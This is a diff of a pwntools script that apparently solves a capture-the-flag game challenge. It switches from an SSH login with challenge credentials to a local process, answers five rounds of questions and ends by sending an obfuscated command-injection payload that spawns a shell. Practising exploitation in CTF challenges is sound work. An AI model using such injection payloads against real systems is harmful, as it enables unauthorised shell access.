@@ -1,8 +1,8 @@
 from pwn import *
 
 # context.log_level = 'debug'
-s = ssh(host='ubuntu.hanukoon.com', user='chall1', password='givemeflag')
-p = s.process('./main_exe')
+p = process('./main_exe')
+
 p.send('\n') # start game
 
 p.sendline('q') # quit game
@@ -14,7 +14,7 @@ p.sendline('H4C') # secret mode!!!
 p.recv()
 for repeat in range(5):
     print p.recvuntil('(New Wave!)')
-    q = p.recv(2048).replace('Your Attack:', '').strip()
+    q = p.recv(2048).strip()
     for f in ['<[', ']>', '=>> ((???))', '!']:
         q = q.replace(f, '').strip()
     print('question:', q)
@@ -40,5 +40,5 @@ for repeat in range(5):
     print [p.recvline()]
     log.success(str(repeat+1))
 
-p.sendline("$'\\x73\\x68'") # command injection
+p.sendline(";$'\\x73\\x68'") # command injection
 p.interactive()
